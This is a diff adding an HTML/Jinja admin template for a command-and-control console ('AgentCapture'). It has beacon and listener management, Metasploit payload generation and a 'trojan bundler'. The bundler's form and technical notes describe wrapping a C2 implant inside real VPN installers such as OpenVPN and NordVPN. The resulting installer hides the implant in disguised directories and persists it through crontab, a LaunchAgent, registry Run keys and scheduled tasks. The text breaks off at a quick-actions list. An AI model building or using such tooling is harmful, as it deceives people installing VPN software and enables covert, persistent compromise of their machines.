@@ -1,0 +1,1193 @@
+{% extends 'admin/base.html' %}
+{% from 'admin/_macros.html' import page_header, section_header %}
+{% block content %}
+<script>document.documentElement.classList.add('c2-appmode');</script>
+
+<style>
+/* ==== Managed Console shell — layout mirrors PentestManus ManagedClientConsole.
+   Sizing: app-mode fill (see boot script below). Colors: console-scoped
+   variables with a dark default and a [data-theme="light"] override block at
+   the end of this sheet, so the theme toggle re-skins every surface. ==== */
+.mc {
+  --mc-shell-bg: var(--surface-gradient, #0a111f);
+  --mc-toolbar-bg: rgba(13,17,23,0.85);
+  --mc-panel-bg: color-mix(in srgb, var(--border) 6%, transparent);
+  --mc-inset-bg: rgba(0,0,0,0.42);
+  --mc-head-bg: rgba(5,8,15,0.92);
+  --mc-head-fg: rgba(103,232,249,0.72);
+  --mc-row-line: color-mix(in srgb, var(--border) 50%, transparent);
+  --mc-shadow: 0 18px 50px rgba(2,6,23,0.35);
+  --mc-menu-bg: var(--surface-gradient, #0a111f);
+}
+[data-theme="light"] .mc {
+  --mc-shell-bg: #ffffff;
+  --mc-toolbar-bg: #f1f5f9;
+  --mc-panel-bg: #f8fafc;
+  --mc-inset-bg: #ffffff;
+  --mc-head-bg: #f1f5f9;
+  --mc-head-fg: #475569;
+  --mc-row-line: rgba(15,23,42,0.08);
+  --mc-shadow: 0 10px 30px rgba(15,23,42,0.10);
+  --mc-menu-bg: #ffffff;
+}
+html.c2-appmode .content { padding-bottom:28px !important; max-width:none !important; }
+html.c2-appmode .workspace { min-height:100%; }
+.mcs { display:flex; flex-direction:column; height:100%; }
+
+.mc-shell {
+  display:flex; flex-direction:column;
+  flex:1 1 auto; min-height:460px;
+  border-radius:14px;
+  border:1px solid var(--border);
+  background:var(--mc-shell-bg);
+  box-shadow:var(--mc-shadow);
+  overflow:hidden;
+}
+/* Active tab region shrinks (never grows past its share); the dock keeps a
+   fixed height so the command input stays reachable at any window size. */
+.tab-content { display:none; min-height:0; flex:1 1 auto; overflow:hidden; }
+#tab-table .mc-grid-wrap, #tab-tasks .mc-grid-wrap { height:100%; max-height:none; overflow:auto; }
+.tab-content > .tabpad { height:100%; overflow-y:auto; box-sizing:border-box; }
+.mc-dock { flex:0 0 auto; }
+
+/* toolbar = brand chip + tab buttons + refresh + counters (source parity) */
+.mc-toolbar { display:flex; flex-wrap:wrap; align-items:center; gap:6px; padding:10px 12px; border-bottom:1px solid var(--tech-line); background:var(--mc-toolbar-bg); }
+/* Global admin.css sets input/select/button to width:100%; scope our console
+   controls back to intrinsic width (page-level override per design system). */
+.mcs input, .mcs select, .mcs button { width:auto; flex:0 0 auto; }
+.mc-inrow input#cmd-input { flex:1 1 auto !important; min-width:0; }
+.mcs label.fl input, .mcs label.fl select { width:100%; }
+.mcs .mc-chip {
+  height:30px; display:inline-flex; align-items:center; padding:0 14px;
+  border-radius:999px; font-family:"Fira Code", ui-monospace, monospace;
+  font-size:12px; font-weight:800; letter-spacing:0.04em;
+  color:#f8fbff; background:linear-gradient(135deg, rgba(var(--pm-accent-rgb), 0.95), rgba(var(--pm-accent-rgb), 0.65));
+  box-shadow:0 0 28px rgba(var(--pm-accent-rgb), 0.30);
+}
+.mc-toolbar-divider { width:1px; height:24px; background:var(--tech-line); margin:0 4px; }
+.mcs button.mc-tab-btn {
+  height:30px; padding:0 13px; border-radius:999px; cursor:pointer;
+  border:1px solid var(--border); background:var(--border-weak, rgba(148,163,184,0.08));
+  font-family:"Fira Code", ui-monospace, monospace; font-size:11.5px; font-weight:800;
+  color:var(--muted-foreground); transition:all 150ms ease;
+}
+.mcs button.mc-tab-btn:hover { border-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 40%, transparent); color:var(--foreground); background:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 9%, transparent); }
+.mcs button.mc-tab-btn.active { border-color:transparent; color:#f8fbff; background:linear-gradient(135deg, rgba(var(--pm-accent-rgb), 0.95), rgba(var(--pm-accent-rgb), 0.65)); box-shadow:0 0 28px rgba(var(--pm-accent-rgb), 0.30); }
+.mc-toolbar-right { margin-left:auto; display:flex; align-items:center; gap:14px; font-size:12px; color:var(--muted-foreground); font-variant-numeric:tabular-nums; }
+.mc-toolbar-right b.ok { color:var(--success); } .mc-toolbar-right b { color:var(--foreground); }
+
+/* host grid */
+.mc-grid-wrap { overflow:auto; max-height:480px; scrollbar-width:thin; scrollbar-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 30%, transparent) transparent; }
+table.mc-table { width:100%; border-collapse:collapse; font-size:12.5px; }
+table.mc-table th { position:sticky; top:0; z-index:2; text-align:left; padding:9px 12px; background:var(--mc-head-bg); border-bottom:1px solid var(--tech-line); font-family:"Fira Code", ui-monospace, monospace; font-size:10.5px; letter-spacing:0.1em; color:var(--mc-head-fg); text-transform:uppercase; white-space:nowrap; }
+table.mc-table td { padding:9px 12px; border-bottom:1px solid color-mix(in srgb, var(--border) 50%, transparent); white-space:nowrap; }
+tr.mc-row { cursor:pointer; transition:background-color 140ms ease; }
+tr.mc-row:hover td { background:color-mix(in srgb, var(--tech-cyan) 6%, transparent); }
+tr.mc-row.selected td { background:color-mix(in srgb, var(--tech-cyan) 11%, transparent); box-shadow:inset 0 0 18px color-mix(in srgb, var(--tech-cyan) 6%, transparent); }
+.mc-dot { width:9px; height:9px; border-radius:999px; display:inline-block; }
+.mc-dot.online { background:var(--success); box-shadow:0 0 8px rgba(52,211,153,0.7); }
+.mc-dot.stale { background:var(--warning); }
+.mc-dot.offline { background:color-mix(in srgb, var(--muted-foreground) 55%, transparent); }
+code.mc-mono { font-family:"Fira Code", ui-monospace, monospace; font-size:11.5px; color:rgb(var(--pm-accent-rgb)); }
+.mc-note-cell { max-width:130px; overflow:hidden; text-overflow:ellipsis; }
+button.mc-x { border:0; background:none; color:var(--muted-foreground); cursor:pointer; font-size:12px; padding:2px 6px; border-radius:6px; transition:color 140ms ease, background-color 140ms ease; }
+button.mc-x:hover { color:var(--danger); background:color-mix(in srgb, var(--danger) 10%, transparent); }
+
+/* status pills (source palette semantics on our badge base) */
+.pill { display:inline-block; padding:2px 9px; border-radius:7px; font-size:10.5px; font-weight:700; font-family:"Fira Code", ui-monospace, monospace; border:1px solid transparent; }
+.pill.completed, .pill.approved, .pill.online, .pill.active { border-color:color-mix(in srgb, var(--success) 35%, transparent); background:color-mix(in srgb, var(--success) 14%, transparent); color:var(--success); }
+.pill.running, .pill.leased, .pill.queued { border-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 35%, transparent); background:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 15%, transparent); color:rgb(var(--pm-accent-rgb)); }
+.pill.pending, .pill.pending_approval, .pill.stale { border-color:color-mix(in srgb, var(--warning) 35%, transparent); background:color-mix(in srgb, var(--warning) 15%, transparent); color:var(--warning); }
+.pill.failed, .pill.cancelled, .pill.rejected, .pill.offline, .pill.closed { border-color:color-mix(in srgb, var(--danger) 35%, transparent); background:color-mix(in srgb, var(--danger) 15%, transparent); color:var(--danger); }
+.risk-low { color:var(--muted-foreground); } .risk-medium { color:var(--warning); } .risk-high, .risk-critical { color:var(--danger); font-weight:700; }
+
+/* info strip + quick actions + console dock */
+.mc-dock { padding:16px 18px; border-top:1px solid var(--tech-line); background:var(--mc-panel-bg); }
+.mc-info-strip { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:8px 18px; margin-bottom:12px; }
+.mc-info-item .label { font-family:"Fira Code", ui-monospace, monospace; font-size:9.5px; letter-spacing:0.13em; color:var(--muted-foreground); text-transform:uppercase; opacity:0.85; }
+.mc-info-item .value { margin-top:2px; font-family:"Fira Code", ui-monospace, monospace; font-size:12px; font-weight:700; color:var(--foreground); word-break:break-all; }
+.mc-info-item .value.root { color:var(--danger); }
+.mc-quick { display:flex; flex-wrap:wrap; gap:7px; margin-bottom:12px; }
+.mcs .mc-quick button.mc-qbtn { padding:6px 11px; border-radius:999px; cursor:pointer; font-size:11px; font-weight:700; border:1px solid var(--border); background:var(--border-weak, rgba(148,163,184,0.08)); color:var(--foreground); transition:all 150ms ease; }
+.mcs .mc-quick button.mc-qbtn:hover { border-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 50%, transparent); color:var(--foreground); background:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 8%, transparent); }
+.mc-out { height:190px; overflow-y:auto; padding:12px 14px; border-radius:12px; background:var(--mc-inset-bg); border:1px solid var(--tech-line); font-family:"Fira Code", ui-monospace, monospace; font-size:12px; line-height:1.7; }
+.mc-out .l-command { color:rgb(var(--pm-accent-rgb)); } .mc-out .l-ok { color:var(--success); }
+.mc-out .l-error { color:var(--danger); white-space:pre-wrap; }
+.mc-out .l-result { color:var(--foreground); white-space:pre-wrap; }
+.mc-out .l-info { color:var(--muted-foreground); white-space:pre-wrap; }
+.mc-inrow { display:flex; align-items:center; gap:9px; margin-top:10px; }
+.mc-inrow .prefix { font-family:"Fira Code", ui-monospace, monospace; color:var(--tech-cyan); font-size:12.5px; font-weight:700; white-space:nowrap; }
+.empty-hint { text-align:center; padding:44px 20px; color:var(--muted-foreground); font-size:12.5px; }
+
+/* generic panel inside tabs */
+.tabpad { padding:16px 18px; }
+h3.sec { margin:0 0 10px; font-size:14px; font-weight:700; color:var(--foreground); }
+form.stack > * + * { margin-top:10px; }
+label.fl { display:flex; flex-direction:column; gap:5px; min-width:0; }
+label.fl > span { font-family:"Fira Code", ui-monospace, monospace; font-size:9.5px; font-weight:700; letter-spacing:0.14em; color:var(--tech-cyan); opacity:0.75; text-transform:uppercase; }
+label.fl > span::before { content:"▸ "; color:var(--tech-cyan); opacity:0.9; }
+.g2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; } .g3 { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; }
+.mcs button.btn-primary { align-self:flex-start; padding:9px 18px; border:0; border-radius:9px; background:rgb(var(--pm-accent-rgb)); color:#f8fbff; font-size:12.5px; font-weight:700; cursor:pointer; transition:background-color 150ms ease; }
+.mcs button.btn-primary:hover { background:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 82%, black); }
+.mcs button.btn-ghost { padding:6px 12px; border-radius:8px; cursor:pointer; font-size:11px; font-weight:700; border:1px solid var(--border); background:var(--border-weak, rgba(148,163,184,0.08)); color:var(--foreground); transition:all 150ms ease; }
+.mcs button.btn-ghost:hover { border-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 50%, transparent); color:var(--foreground); }
+.mcs button.btn-ghost.danger { border-color:color-mix(in srgb, var(--danger) 38%, transparent); color:var(--danger); }
+.cardbox { padding:13px; border-radius:12px; border:1px solid var(--border); background:color-mix(in srgb, var(--border) 6%, transparent); }
+.lgrid { display:grid; grid-template-columns:repeat(auto-fill,minmax(255px,1fr)); gap:11px; }
+.token-flash { border:1px solid color-mix(in srgb, var(--success) 45%, transparent); border-radius:10px; padding:11px 13px; }
+.token-flash code { color:var(--success); word-break:break-all; font-size:13px; }
+.muted-sm { color:var(--muted-foreground); font-size:11.5px; }
+.art-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(190px,1fr)); gap:9px; }
+.art-card { position:relative; display:block; padding:10px 12px; border-radius:10px; border:1px solid var(--border); background:var(--border-weak, rgba(148,163,184,0.08)); cursor:pointer; transition:border-color 150ms ease, background-color 150ms ease; }
+.art-card:hover { border-color:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 45%, transparent); }
+.art-card.selected { border-color:rgb(var(--pm-accent-rgb)); background:color-mix(in srgb, rgb(var(--pm-accent-rgb)) 9%, transparent); }
+.art-card input { position:absolute; opacity:0; pointer-events:none; }
+.art-card .af-name { font-family:"Fira Code", ui-monospace, monospace; font-size:12.5px; font-weight:700; color:rgb(var(--pm-accent-rgb)); }
+.art-card .af-desc { margin-top:3px; font-size:10.5px; color:var(--muted-foreground); line-height:1.5; }
+@media (max-width:1180px) { .g2,.g3 { grid-template-columns:1fr; } }
+
+/* ==== LIGHT THEME: console buttons must not inherit the global
+   [data-theme=light] dark-gradient button skin (0-3-1); these rules are
+   0-4-1 and come later, so every console control reverts to its own
+   light surface. ==== */
+[data-theme="light"] .mcs .mc-toolbar button.mc-tab-btn,
+[data-theme="light"] .mcs .mc-quick button.mc-qbtn,
+[data-theme="light"] .mcs button.btn-ghost,
+[data-theme="light"] .mcs button.mc-tab-btn {
+  background: #f1f5f9;
+  color: #334155;
+  border-color: rgba(15, 23, 42, 0.14);
+  box-shadow: none;
+}
+[data-theme="light"] .mcs button.mc-tab-btn:hover,
+[data-theme="light"] .mcs .mc-quick button.mc-qbtn:hover,
+[data-theme="light"] .mcs button.btn-ghost:hover {
+  background: #e2e8f0;
+  color: #0f172a;
+}
+[data-theme="light"] .mcs button.btn-primary {
+  background: rgb(var(--pm-accent-rgb));
+  color: #ffffff;
+}
+[data-theme="light"] .mcs button.btn-ghost.danger {
+  color: var(--danger);
+  background: color-mix(in srgb, var(--danger) 7%, white);
+}
+[data-theme="light"] .mcs button.mc-qbtn[style*="--danger"],
+[data-theme="light"] .mcs .mc-quick button.mc-qbtn.danger {
+  color: var(--danger);
+}
+
+/* Inputs / selects in forms keep readable light fields. */
+[data-theme="light"] .mcs label.fl input,
+[data-theme="light"] .mcs label.fl select {
+  background: #ffffff;
+  border-color: rgba(15, 23, 42, 0.16);
+  color: #0f172a;
+}
+
+/* Context menu + artifact cards already use --mc-* vars; force them here
+   because inline style on #host-menu carries a fallback only. */
+#host-menu {
+  background: var(--mc-menu-bg);
+  box-shadow: var(--mc-shadow);
+  border: 1px solid var(--border);
+}
+[data-theme="light"] #host-menu { background:#ffffff; box-shadow:0 12px 34px rgba(15,23,42,0.16); }
+[data-theme="light"] #host-menu button { color:#334155; }
+[data-theme="light"] #host-menu button[style*="--danger"],
+[data-theme="light"] #host-menu .danger { color: var(--danger) !important; }
+[data-theme="light"] .art-card { background:#f8fafc; }
+[data-theme="light"] .art-card.selected { background:#eff6ff; }
+
+/* Dock output area (transcript) reads better on pure white with darker ink. */
+[data-theme="light"] .mc-out .l-command { color: #1d4ed8; }
+[data-theme="light"] .mc-out .l-ok { color: #047857; }
+</style>
+
+<div id="host-menu" style="display:none;position:fixed;z-index:60;min-width:180px;padding:6px;border-radius:10px;"></div>
+<div class="mcs">
+  <div class="mc-shell">
+    <!-- toolbar row -->
+    <div class="mc-toolbar">
+      <span class="mc-chip">AgentCapture</span>
+      <span class="mc-toolbar-divider"></span>
+      <button type="button" class="mc-tab-btn active" data-tab="table" onclick="switchTab('table')">Beacon 列表</button>
+      <button type="button" class="mc-tab-btn" data-tab="tasks" onclick="switchTab('tasks')">任务队列</button>
+      <button type="button" class="mc-tab-btn" data-tab="beacons" onclick="switchTab('beacons')">Beacon 生成</button>
+      <button type="button" class="mc-tab-btn" data-tab="listeners" onclick="switchTab('listeners')">Listener</button>
+      <button type="button" class="mc-tab-btn" data-tab="msf" onclick="switchTab('msf')">MSF</button>
+      <button type="button" class="mc-tab-btn" data-modal-open="bundler-modal">木马捆绑</button>
+      <button type="button" class="mc-tab-btn" onclick="loadOverview()">↻ 刷新</button>
+      <div class="mc-toolbar-right">
+        <span>在线 <b class="ok" id="t-online">0</b>/<b id="t-hosts">0</b></span>
+        <span>任务 <b id="t-tasks">0</b></span>
+        <span id="t-pending-wrap" style="display:none">待审批 <b style="color:var(--danger)" id="t-pending">0</b></span>
+        <span id="overview-generated" class="muted-sm"></span>
+      </div>
+    </div>
+
+    <!-- ======== TAB: table (host grid) ======== -->
+    <div class="tab-content" id="tab-table" style="display:block">
+      <div class="mc-grid-wrap">
+        <table class="mc-table">
+          <thead><tr><th style="width:32px"></th><th>外部 IP</th><th>内部 IP</th><th>用户</th><th>主机名</th><th>系统</th><th>架构</th><th>Listener</th><th>最后心跳</th><th>备注</th><th style="width:40px"></th></tr></thead>
+          <tbody id="hosts-tbody"></tbody>
+        </table>
+      </div>
+      <div class="empty-hint" id="hosts-empty" style="display:none">暂无受管主机 — 在「Listener」创建监听器，于「Beacon 生成」产出脚本并在目标环境执行后，主机将在此上线。</div>
+    </div>
+
+    <!-- ======== TAB: tasks ======== -->
+    <div class="tab-content" id="tab-tasks" style="display:none">
+      <div class="mc-grid-wrap">
+        <table class="mc-table">
+          <thead><tr><th>ID</th><th>代码</th><th>类型</th><th class="cp">命令</th><th>状态</th><th>风险</th><th>审批</th><th>结果摘要</th><th>动作</th></tr></thead>
+          <tbody id="tasks-tbody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ======== TAB: beacons ======== -->
+    <div class="tab-content" id="tab-beacons" style="display:none">
+      <div class="tabpad g2" style="align-items:start">
+        <div>
+          <div style="display:flex;gap:8px;margin-bottom:12px">
+            <button type="button" class="mc-tab-btn active" id="gen-mode-beacon" onclick="switchGenMode('beacon')">Agent-Contract Beacon</button>
+            <button type="button" class="mc-tab-btn" id="gen-mode-artifact" onclick="switchGenMode('artifact')">Artifact 矩阵</button>
+          </div>
+          <div id="gen-beacon">
+          <h3 class="sec">受管 Beacon 生成器</h3>
+          <p class="muted-sm" style="margin-top:0">选择 Listener 自动带入回连地址、端口与注册令牌。Python 模板内置 9 类操作执行体；bash/powershell 为租约占位模板。</p>
+          <form id="beacon-form" class="stack" onsubmit="return generateBeacon(event)">
+            <label class="fl"><span>Listener</span><select name="listenerId" id="beacon-listener" onchange="onBeaconListenerChange()"></select></label>
+            <label class="fl"><span>运行时</span>
+              <select name="runtimeType">
+                <option value="python">Python（完整执行体）</option>
+                <option value="bash">Bash（占位）</option>
+                <option value="powershell">PowerShell（占位）</option>
+              </select>
+            </label>
+            <div class="g3">
+              <label class="fl"><span>回连地址</span><input name="targetHost" value="127.0.0.1"></label>
+              <label class="fl"><span>端口</span><input name="targetPort" type="number" value="8443"></label>
+              <label class="fl"><span>心跳间隔（秒）</span><input name="sleepSeconds" type="number" value="5" min="1" max="3600"></label>
+            </div>
+            <button type="submit" class="btn-primary">生成 Beacon</button>
+          </form>
+          </div>
+          <div id="gen-artifact" style="display:none">
+          <h3 class="sec">Artifact 矩阵</h3>
+          <p class="muted-sm" style="margin-top:0">Cobalt Strike 风格产物矩阵（8 格式 × 4 平台 × 4 架构）。宿主缺 nasm/mingw 时确定性降级并在 compile_log 注明。</p>
+          <div class="stack">
+            <div class="field-label" style="display:block"><span style="font-family:'Fira Code',monospace;font-size:9.5px;letter-spacing:.14em;color:var(--tech-cyan);opacity:.75">格式 // FORMAT</span></div>
+            <div class="art-grid" id="art-grid"></div>
+            <div class="g3">
+              <label class="fl"><span>平台</span><select id="art-platform"></select></label>
+              <label class="fl"><span>架构</span><select id="art-arch"></select></label>
+              <label class="fl"><span>输出类型（msbuild）</span><select id="art-output"><option>Exe</option><option>Library</option></select></label>
+            </div>
+            <button type="button" class="btn-primary" onclick="generateArtifact()">生成 Artifact</button>
+          </div>
+        </div>
+        </div>
+        <div>
+          <h3 class="sec">生成结果</h3>
+          <pre class="mc-out" id="beacon-result" style="height:300px">等待生成…</pre>
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button type="button" class="btn-ghost" onclick="downloadCurrent()">下载</button>
+            <button type="button" class="btn-ghost" onclick="copyBeacon()">复制到剪贴板</button>
+            <span class="muted-sm" id="beacon-meta" style="align-self:center"></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ======== TAB: listeners ======== -->
+    <div class="tab-content" id="tab-listeners" style="display:none">
+      <div class="tabpad">
+        <div style="display:flex;justify-content:flex-end;margin-bottom:14px">
+          <button type="button" class="chip primary" data-modal-open="listener-create-modal">＋ 新建监听器</button>
+        </div>
+        <div class="token-flash" id="listener-new-token" style="display:none;margin-bottom:12px">
+          <div style="font-size:10.5px;font-weight:700;color:var(--success);margin-bottom:4px">注册令牌（仅显示一次）</div>
+          <code id="listener-token-value"></code>
+        </div>
+        <h3 class="sec">已配置监听器</h3>
+        <div class="lgrid" id="listener-grid"></div>
+      </div>
+    </div>
+
+    <!-- ======== TAB: msf ======== -->
+    <div class="tab-content" id="tab-msf" style="display:none">
+      <div class="tabpad">
+        <div id="msf-status-bar" class="muted-sm" style="margin-bottom:14px">检测 MSF 集成状态…</div>
+        <div class="g2" style="align-items:start">
+          <div>
+            <h3 class="sec">RPC 配置</h3>
+            <form id="msf-config-form" class="stack" onsubmit="return saveMsfConfig(event)">
+              <div class="g2">
+                <label class="fl"><span>Host</span><input name="host" value="127.0.0.1"></label>
+                <label class="fl"><span>Port</span><input name="port" type="number" value="55553"></label>
+              </div>
+              <div class="g2">
+                <label class="fl"><span>用户名</span><input name="username" value="msf"></label>
+                <label class="fl"><span>密码</span><input name="password" type="password" placeholder="留空保留旧值"></label>
+              </div>
+              <label style="display:inline-flex;align-items:center;gap:6px;font-size:12px;color:var(--muted-foreground);cursor:pointer"><input type="checkbox" name="ssl" checked style="width:auto"> SSL</label>
+              <div style="display:flex;gap:8px">
+                <button type="submit" class="btn-primary">保存配置</button>
+                <button type="button" class="btn-ghost" onclick="msfDaemon('start')">启动 msfrpcd</button>
+                <button type="button" class="btn-ghost danger" onclick="msfDaemon('stop')">停止 msfrpcd</button>
+              </div>
+            </form>
+          </div>
+          <div>
+            <h3 class="sec">Payload 生成（msfvenom）</h3>
+            <form id="msf-payload-form" class="stack" onsubmit="return generateMsfPayload(event)">
+              <label class="fl"><span>Payload</span><select name="payload" id="msf-payload-select"></select></label>
+              <div class="g3">
+                <label class="fl"><span>LHOST</span><input name="lhost" value="0.0.0.0"></label>
+                <label class="fl"><span>LPORT</span><input name="lport" type="number" value="4444"></label>
+                <label class="fl"><span>格式</span><select name="format"><option>exe</option><option>elf</option><option>psh</option><option>py</option></select></label>
+              </div>
+              <button type="submit" class="btn-primary">生成并下载</button>
+            </form>
+          </div>
+        </div>
+        <h3 class="sec" style="margin-top:16px">会话</h3>
+        <div class="mc-grid-wrap" style="max-height:240px">
+          <table class="mc-table"><thead><tr><th>ID</th><th>类型</th><th>信息</th><th>来源</th><th>动作</th></tr></thead><tbody id="msf-sessions-tbody"></tbody></table>
+        </div>
+      </div>
+    </div><!-- /tab-msf -->
+
+    <div class="modal-backdrop" id="listener-create-modal" hidden data-modal-backdrop>
+      <div class="modal" role="dialog" aria-modal="true" style="width:min(720px,100%)">
+        <div class="modal-header">
+          <div>
+            <h2 class="modal-title" id="listener-create-title">新建受管监听器</h2>
+            <p class="muted" style="margin:6px 0 0;font-size:12.5px">创建后自动生成注册令牌，Beacon 携带令牌上线即绑定此监听器。</p>
+          </div>
+          <button type="button" class="modal-close" data-modal-close aria-label="关闭">×</button>
+        </div>
+        <div class="modal-body">
+          <form id="listener-form" class="stack" onsubmit="return createListener(event)">
+            <label class="fl"><span>名称 *</span><input name="name" placeholder="如 lab-https-reverse" required></label>
+            <label class="fl"><span>Transport</span><select name="transport" id="listener-transport"></select></label>
+            <div class="g2">
+              <label class="fl"><span>绑定地址</span><input name="bindAddress" value="0.0.0.0"></label>
+              <label class="fl"><span>端口</span><input name="bindPort" type="number" value="8443"></label>
+            </div>
+            <div style="display:flex;justify-content:flex-end;gap:10px;padding-top:6px">
+              <button type="button" class="btn-ghost" data-modal-close>取消</button>
+              <button type="submit" class="btn-primary">新建监听器</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div class="modal-backdrop" id="bundler-modal" hidden data-modal-backdrop>
+      <div class="modal" role="dialog" aria-modal="true" aria-labelledby="bundler-title" style="width:min(880px,100%)">
+        <div class="modal-header">
+          <div>
+            <h2 class="modal-title" id="bundler-title">木马捆绑工具</h2>
+            <p class="muted" style="margin:6px 0 0;font-size:12.5px">将 C2 植入物与合法 VPN 安装包捆绑，生成木马化安装程序（Linux / macOS / Windows）。</p>
+          </div>
+          <button type="button" class="modal-close" data-modal-close aria-label="关闭">×</button>
+        </div>
+        <div class="modal-body">
+          <form method="post" action="/admin/c2/bundler/generate" class="stack">
+            <div class="g2">
+              <label class="fl"><span>目标平台</span>
+                <select name="bundle_type">
+                  <option value="linux">Linux (.sh) — OpenVPN 捆绑 + crontab 持久化</option>
+                  <option value="macos">macOS (.sh) — Tunnelblick 捆绑 + LaunchAgent</option>
+                  <option value="windows">Windows (.bat) — OpenVPN 捆绑 + 注册表/计划任务</option>
+                </select>
+              </label>
+              <label class="fl"><span>快速预设</span>
+                <select id="bundler-preset">
+                  <option value="">自定义配置</option>
+                  <option value="openvpn">OpenVPN 客户端 (通用)</option>
+                  <option value="expressvpn">ExpressVPN 客户端</option>
+                  <option value="nordvpn">NordVPN 客户端</option>
+                  <option value="wireguard">WireGuard 客户端</option>
+                  <option value="cisco">Cisco AnyConnect</option>
+                </select>
+              </label>
+            </div>
+            <label class="fl"><span>C2 服务器地址</span><input type="text" name="c2_server" placeholder="留空使用当前地址 (http://<host>:8000)"></label>
+            <label class="fl"><span>绑定 C2 监听器（植入物将携带注册令牌）</span>
+              <select name="listener_id" id="bundler-listener">
+                <option value="0">匿名（不绑定监听器）</option>
+              </select>
+            </label>
+            <div class="g2">
+              <label class="fl"><span>VPN 名称</span><input type="text" name="vpn_name" id="bundler-vpn-name" value="OpenVPN"></label>
+              <label class="fl"><span>VPN 下载 URL（用于掩盖木马）</span><input type="text" name="vpn_url" id="bundler-vpn-url" placeholder="https://openvpn.net/downloads/install.sh"></label>
+            </div>
+            <div class="g2">
+              <label class="fl"><span>轮询间隔（秒）</span><input type="number" name="poll_interval" value="10" min="1" max="3600"></label>
+              <label class="fl" style="flex-direction:row;align-items:center;gap:8px;align-self:end;padding-bottom:12px"><input type="checkbox" name="persistence" value="true" checked style="width:auto;margin:0"> <span style="text-transform:none;letter-spacing:0">持久化（开机自启）</span></label>
+            </div>
+            <details style="border:1px solid rgba(148,163,184,.14);border-radius:12px;padding:10px 12px">
+              <summary style="cursor:pointer;font-size:12.5px;color:var(--muted-foreground)">技术说明：各平台捆绑包实现方式</summary>
+              <div class="stack" style="margin-top:10px;font-size:12px;color:var(--muted-foreground);line-height:1.65">
+                <div><strong style="color:var(--foreground)">Linux (.sh)</strong>：自解压脚本，先装 VPN 再静默释放植入物到 <code>~/.cache/.sysd/</code>，nohup 后台运行，支持 crontab @reboot 持久化。</div>
+                <div><strong style="color:var(--foreground)">macOS (.sh)</strong>：释放到 <code>~/Library/Application Support/.systemd/</code>，LaunchAgent plist 用户级持久化，无窗口后台运行。</div>
+                <div><strong style="color:var(--foreground)">Windows (.bat)</strong>：PowerShell 下载植入物，pythonw.exe 无窗口运行；HKCU Run 注册表键 + schtasks 双重持久化。</div>
+                <div><strong style="color:var(--foreground)">Agent 植入物</strong>：纯 Python 3 零依赖，支持命令执行、文件读写/下载、自卸载；指数退避轮询（10s → 300s），心跳上报系统信息。</div>
+              </div>
+            </details>
+            <div style="display:flex;justify-content:flex-end;gap:10px;padding-top:6px">
+              <button type="button" class="btn-ghost" data-modal-close>取消</button>
+              <button type="submit" class="btn-primary">生成并下载捆绑包</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <script>
+    /* 木马捆绑：VPN 预设联动（独立作用域，避免与主控制台脚本冲突） */
+    (function(){
+      var PRESETS = {
+        openvpn:    {vpn_name:'OpenVPN',          vpn_url:'https://swupdate.openvpn.org/community/releases/openvpn-install-latest.sh'},
+        expressvpn: {vpn_name:'ExpressVPN',       vpn_url:'https://www.expressvpn.com/latest#linux'},
+        nordvpn:    {vpn_name:'NordVPN',          vpn_url:'https://downloads.nordcdn.com/apps/linux/install.sh'},
+        wireguard:  {vpn_name:'WireGuard',        vpn_url:'https://git.io/wireguard-install'},
+        cisco:      {vpn_name:'Cisco AnyConnect', vpn_url:'https://example.com/anyconnect-install.sh'}
+      };
+      var sel = document.getElementById('bundler-preset');
+      if (sel) sel.addEventListener('change', function(){
+        var p = PRESETS[this.value];
+        if (!p) return;
+        document.getElementById('bundler-vpn-name').value = p.vpn_name;
+        document.getElementById('bundler-vpn-url').value = p.vpn_url;
+      });
+    })();
+    </script>
+
+    <!-- console dock：仅 table/tasks 可见且选中主机时展示（源约定） -->
+    <div class="mc-dock" id="console-dock" style="display:none">
+      <div class="mc-info-strip" id="info-strip"></div>
+      <div class="mc-quick" id="quick-actions"></div>
+      <div class="mc-out" id="dock-output"><div class="l-info">[sys] C2 控制台就绪，双击 Beacon 进入交互。</div></div>
+      <div class="mc-inrow">
+        <span class="prefix" id="cmd-prefix">shell&gt;</span>
+        <input id="cmd-input" placeholder="输入命令，↑ 召回历史..." onkeydown="cmdKeydown(event)" />
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* Populate the bundler's listener binding select from the implant listener
+   registry (includes registration tokens — operator-facing console only). */
+(function () {
+  var sel = document.getElementById('bundler-listener');
+  if (!sel) return;
+  fetch('/api/admin/c2/listeners', { credentials: 'same-origin' })
+    .then(function (r) { return r.ok ? r.json() : []; })
+    .then(function (listeners) {
+      (listeners || []).forEach(function (l) {
+        var opt = document.createElement('option');
+        opt.value = l.id;
+        opt.textContent = l.name + ' (' + l.protocol + ' :' + l.bind_port + ')'
+          + (l.is_enabled ? '' : ' [已停用]');
+        sel.appendChild(opt);
+      });
+    })
+    .catch(function () { /* leave anonymous-only */ });
+})();
+</script>
+<script>
+/* =========================================================================
+   Managed console — behaviour mirrors PentestManusWeb ManagedClientConsole:
+   single overview poll (5s) feeds every tab; tab switch is local-only;
+   dock is visible on table/tasks tabs when a host is selected.
+   ========================================================================= */
+var state = {
+  overview: null,
+  selectedHostId: null,
+  interactMode: false,      // double-click engages interaction
+  tab: 'table',
+  lastBeacon: null,
+  cmdHistory: [],
+  cmdHistoryIdx: -1,
+};
+
+/* 22 quick actions — same labels / commands as the source QUICK_ACTIONS. */
+var QUICK_ACTIONS = [
